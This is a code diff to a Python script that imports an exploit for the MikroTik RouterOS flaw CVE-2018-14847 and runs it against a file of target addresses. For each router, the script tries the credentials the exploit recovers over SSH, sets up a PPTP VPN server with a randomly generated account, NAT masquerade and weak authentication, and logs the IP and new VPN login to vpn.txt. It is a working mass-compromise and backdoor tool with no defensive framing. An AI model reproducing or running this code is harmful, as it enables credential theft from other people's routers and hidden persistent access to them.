@@ -1,4 +1,7 @@
 import paramiko
+import random
+from MikroTik.cve_2018_14847.exploit import exploit
+from MikroTik.cve_2018_14847.get_targets import format_file, format_single_ip
 
 
 class SSHClient:
@@ -11,17 +14,18 @@ class SSHClient:
         self.ssh.connect(host, port, username, password, timeout=10)
 
     def execute(self, command):
-        global stderr
+
         try:
             # print('command', command)
             stdin, stdout, stderr = self.ssh.exec_command(command)
             # print('stdin', stdin)
+            out = stdout.read()
+            # print(out)
+            result = out.decode('ascii')
+            # print(result)
         except:
-            print('stderr', stderr.read().decode('ascii'))
-            return 'error'
-        out = stdout.read()
-
-        result = out.decode('ascii')
+            out=b' '
+            result=out.decode('ascii')
 
         return out, result
 
@@ -38,6 +42,12 @@ class CreateVpn:
         self.usr = usr
         self.pwd = pwd
 
+    def random_profile(self):
+        usr = ''.join(
+            random.sample("1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 6))
+        pwd = ''.join(random.sample("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", 12))
+        return usr, pwd
+
     def connect(self):
         try:
             self.ssh.login(self.ip, self.port, self.usr, self.pwd)
@@ -50,7 +60,7 @@ class CreateVpn:
     # get ethernet information
     def get_ethernet(self):
         eth_info_list = []
-        eth_out, eth_info = self.ssh.execute('/interface ethernet print')
+        eth_out, eth_info= self.ssh.execute('/interface ethernet print')
         # print('ethernet out\n', eth_out)
         eth_list = eth_out.split(b'\r\n')
         for i in range(2, len(eth_list) - 2):
@@ -114,18 +124,20 @@ class CreateVpn:
     def create_vpn(self):
         lan_int = self.get_lan_ethernet()[0][2]
         bri_mac_addr_list, bri_name_list = self.get_bridge()
+        usr, pwd = self.random_profile()
 
         self.ssh.execute('/ip address add address=192.168.100.121/24 interface=' + lan_int)
 
         self.ssh.execute('/ip pool add name="pptp-vpn-pool" ranges=192.168.100.10-192.168.100.30')
         self.ssh.execute(
             '/ppp profile add name="pptp-vpn-profile" use-encryption=yes local-address=192.168.100.121 dns-server=8.8.8.8,0.0.0.0 remote-address=pptp-vpn-pool')
-        self.ssh.execute('/ppp secret add name=asdftest profile=pptp-vpn-profile password=test123!@# service=pptp')
+        self.ssh.execute('/ppp secret add name=' + usr + ' profile=pptp-vpn-profile password=' + pwd + ' service=pptp')
         self.ssh.execute(
             '/interface pptp-server server set enabled=yes default-profile=pptp-vpn-profile authentication=mschap2,mschap1,chap,pap')
         self.ssh.execute(
             '/ip firewall nat add chain=srcnat src-address=192.168.100.121/24 out-interface=' + bri_name_list[
                 0] + ' action=masquerade')
+        return usr, pwd
 
     def disconnect(self):
         self.ssh.close()
@@ -144,5 +156,34 @@ def check_connection(ip, usr, pwd):
 def create_main(ip, usr, pwd):
     vpn = CreateVpn(ip, 22, usr, pwd)
     vpn.connect()
-    vpn.create_vpn()
+    vpn_username, vpn_password = vpn.create_vpn()
     vpn.disconnect()
+    return vpn_username, vpn_password
+
+
+def run():
+    targets = format_file('result.txt')
+    info_list = exploit(targets)
+    print(info_list)
+    for target in info_list:
+        ip = target[0]
+        print(ip)
+        login_info = target[2]
+        print(login_info)
+        for u, p in login_info:
+            print(u, p)
+            check = check_connection(ip, u, p)
+            if check:
+                print('start create vpn')
+                vpn_username, vpn_password = create_main(ip, u, p)
+                vpn_info = [ip, vpn_username, vpn_password]
+                print('write into vpn.txt')
+                with open('vpn.txt', 'a')as f:
+                    f.write(str(vpn_info))
+                print('create vpn success')
+            else:
+                print('wrong password')
+
+
+if __name__ == '__main__':
+    run()
